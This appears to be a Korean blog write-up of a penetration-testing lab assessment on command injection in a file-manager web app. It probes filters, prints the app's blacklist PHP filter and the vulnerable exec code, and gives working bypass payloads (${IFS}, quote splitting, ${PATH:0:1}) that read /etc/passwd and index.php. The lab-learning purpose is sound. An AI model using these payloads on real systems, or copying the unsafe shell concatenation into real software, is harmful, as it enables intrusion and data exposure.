---
title: "Command Injections - Skills Assessment"
date: 2026-07-22
layout: single
excerpt: "한 회사의 의뢰를 받아 침투 테스트를 수행하던 중 파일 관리자 웹 애플리케이션을 발견하였다. 파일 관리자는 내부적으로 시스템 명령어를 실행하는 경우가 많기 때문에, 해당 기능에 커맨드 인젝션 취약점이 존재하는지 확인할 필요가 있다. 필터 식별 및 우회 기법을 활용하여 입력 지점을 분석하고, 적용된 블랙리스트와 특수문자 필터를 우회한 뒤 실제로 임의의 시스템 명령어를 실행할 수 있는지 검증해야 한다."
author_profile: true
toc: true
toc_label: "Command Injection"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/cpts-web/command-injection-skills-assessment/badge.png
  teaser_home_page: true
categories: [cpts-web]
tags: [web, cpts, web-attacks, command-injection]
---

# Scenario

한 회사의 의뢰를 받아 침투 테스트를 수행하던 중 파일 관리자 웹 애플리케이션을 발견하였다. 

파일 관리자는 내부적으로 시스템 명령어를 실행하는 경우가 많기 때문에, 해당 기능에 커맨드 인젝션 취약점이 존재하는지 확인할 필요가 있다. 

필터 식별 및 우회 기법을 활용하여 입력 지점을 분석하고, 적용된 블랙리스트와 특수문자 필터를 우회한 뒤 실제로 임의의 시스템 명령어를 실행할 수 있는지 검증해야 한다.

> 로그인 정보는 다음과 같다: (`guest` / `guest`)

## Web Application Overview

우선 웹 페이지는 다음과 같다:

![Command Injection](/assets/cpts-web/command-injection-skills-assessment/command-injection1.png)

각각의 TXT 파일에는 문자열이 저장되어 있었으며, 파일 보기, 편집, 복사 및 이동, 다운로드 등의 기능을 사용할 수 있었다.

두 장의 문서가 겹친 것처럼 보이는 아이콘을 클릭하면 다음과 같이 파일을 복사하거나 이동할 수 있는 화면이 나타난다:

![Command Injection](/assets/cpts-web/command-injection-skills-assessment/command-injection2.png)

## Identifying Potential Filtering

우선 Burp Suite를 실행한 후 위 사진의 `51459716.txt` 파일을 `tmp` 디렉터리로 이동해 보았다:

![Command Injection](/assets/cpts-web/command-injection-skills-assessment/command-injection3.png)

웹 사이트에서는 파일이 정상적으로 이동되었다.

이후 Burp Suite에서 URL 파라미터에 커맨드 인젝션 필터링이 적용되어 있는지 확인하기 위해 다음 값을 삽입하였다:

```text
to=tmp;
```

그 결과 다음과 같이 `Malicious request denied!` 메시지가 출력되었으며, `;` 문자가 필터링되고 있음을 확인할 수 있었다:

![Command Injection](/assets/cpts-web/command-injection-skills-assessment/command-injection4.png)

이를 토대로 추가적인 테스트를 진행하였다.

`%26%26` 으로 URL 인코딩한 `&&` 를 값 마지막에 삽입한 결과 다음과 같은 오류가 발생했다:

```text
Error while moving: bash: -c: line 1: syntax error: unexpected end of file
```

이는 Bash가 마지막의 `&&` 뒤에 이어질 명령어를 기대했지만, 추가 명령어 없이 입력이 끝났기 때문에 발생한 오류이다.

따라서 해당 파라미터가 Bash 명령어에 포함되고 있으며, 커맨드 인젝션이 가능할 가능성이 높다고 판단하였다.

## Command Structure Hypothesis

`to` 파라미터에는 대상 디렉터리가 전달되고, `from` 파라미터에는 이동할 파일명이 전달된다.

따라서 단순화한 명령어 구조는 다음과 같다고 추측할 수 있다:

```bash
$ mv 51459716.txt /tmp
```

이는 `51459716.txt` 파일을 `tmp` 디렉터리로 이동하는 과정이다.

하지만 `;` 뿐만 아니라 `&&` 연산자를 이용하면 기존 명령어 뒤에 다른 명령어를 연결할 수 있다.

예를 들면 다음과 같다:

```bash
$ mv 51459716.txt /tmp && cat /index.php
```

앞의 `mv` 명령어가 성공하면 `&&` 뒤에 있는 `cat index.php` 명령어가 이어서 실행된다.

따라서 파일을 이동하는 정상적인 명령어 뒤에 블랙리스트 필터링을 우회한 명령어를 추가할 수 있다.

## Exploitation

테스트 결과 `cat`, `whoami`, 일반 공백인 `+` 와 `%20`, 개행 문자인 `%0a`, 그리고 `/` 등이 필터링되고 있음을 확인하였다.

따라서 `to` 파라미터에 다음 페이로드를 삽입하였다:

```text
to=tmp${IFS}%26%26${IFS}{c'a't,${PATH:0:1}etc${PATH:0:1}passwd}
```

그 결과 `/etc/passwd` 의 내용이 출력되었으며, 커맨드 인젝션이 가능함을 확인할 수 있었다:

![Command Injection](/assets/cpts-web/command-injection-skills-assessment/command-injection5.png)

## Source Code Analysis

애플리케이션의 내부 로직을 확인하기 위해 `to` 파라미터에 다음 페이로드를 삽입하였다:

```text
to=tmp${IFS}%26%26${IFS}{c'a't,index.php}
```

이를 통해 확인한 `index.php` 의 필터 함수는 다음과 같다:

```php
function filter($str)
{
    $operators = ['|', ';', '/', ' ', "\n"];

    foreach ($operators as $operator) {
        if (strpos($str, $operator)) {
            return true;
        }
    }

    $words = [
        'whoami', 'echo', 'cat', 'rm', 'cp', 'ls', 'id',
        'curl', 'wget', 'cd', 'sudo', 'mkdir', 'man',
        'history', 'ln', 'grep', 'pwd', 'file', 'find',
        'kill', 'ps', 'uname', 'hostname', 'date', 'uptime',
        'lsof', 'ifconfig', 'ipconfig', 'ip', 'tail',
        'netstat', 'tar', 'apt', 'ssh', 'scp', 'less',
        'more', 'awk', 'head', 'sed', 'nc', 'netcat', 'printf'
    ];

    foreach ($words as $word) {
        if (strpos($str, $word) !== false) {
            return true;
        }
    }

    return false;
}
```

필터에서는 `|`, `;`, `/`, 공백, 개행 문자를 차단하고 있었다.

URL 인코딩된 `%0a` 는 서버에서 실제 개행 문자 `\n` 으로 디코딩되므로 필터에 의해 차단된다.

또한 `whoami`, `cat`, `ls`, `id` 등 주요 명령어도 블랙리스트에 포함되어 있었다. 반면 `&` 문자는 `$operators` 에 포함되어 있지 않으므로, `%26%26` 으로 전달한 `&&` 연산자는 필터를 통과할 수 있었다.

이후 파일 이동 기능의 실제 로직을 확인하였다:

```php
if ($move) { // Move and to != from so just perform move
    // $rename = fm_rename($from, $dest);

    if (!filter($_REQUEST['from']) && !filter($_REQUEST['to'])) {
        $cmd = "bash -c 'mv " . $from . " " . $dest . "' 2>&1";

        exec($cmd, $output, $exitcode);

        $output = implode("<br>", $output);

        if ($exitcode === 0 && $output[0] == '') {
            fm_set_msg(
                sprintf(
                    lng('Moved from') . ' <b>%s</b> ' .
                    lng('to') . ' <b>%s</b>',
                    fm_enc($from),
                    fm_enc($dest)
                )
            );
        } elseif ($exitcode === 1 || $output[0] !== null) {
            fm_set_msg(
                lng('Error while moving: ' . $output),
                'alert'
            );
        } else {
            fm_set_msg(
                sprintf(
                    lng('Error while moving from') . ' <b>%s</b> ' .
                    lng('to') . ' <b>%s</b>',
                    fm_enc($from),
                    fm_enc($dest)
                ),
                'error'
            );
        }
    } else {
        fm_set_msg(
            lng('Malicious request denied!'),
            'alert'
        );
    }
}
```

예상했던 것처럼 `$from` 과 `$dest` 값이 `mv` 명령어 문자열에 직접 연결되고 있었다:

```php
$cmd = "bash -c 'mv " . $from . " " . $dest . "' 2>&1";
```

사용자 입력이 별도의 안전한 인자 처리 없이 셸 명령어에 직접 연결되기 때문에 커맨드 인젝션이 발생한다.

또한 `from` 과 `to` 파라미터 중 하나라도 `filter()` 함수가 `true` 를 반환하면 다음 메시지가 출력된다:

```text
Malicious request denied!
```

반대로 두 파라미터가 모두 필터를 통과하면 `exec()` 를 통해 생성된 Bash 명령어가 실행된다.

그리고 명령어의 출력이 `$output` 에 저장되어 `Error while moving:` 메시지를 통해 화면에 출력된다:

```bash
exec($cmd, $output, $exitcode);

$output = implode("<br>", $output);

# SKIP

elseif ($exitcode === 1 || $output[0] !== null) {
  fm_set_msg(
      lng('Error while moving: ' . $output),
      'alert'
);}
```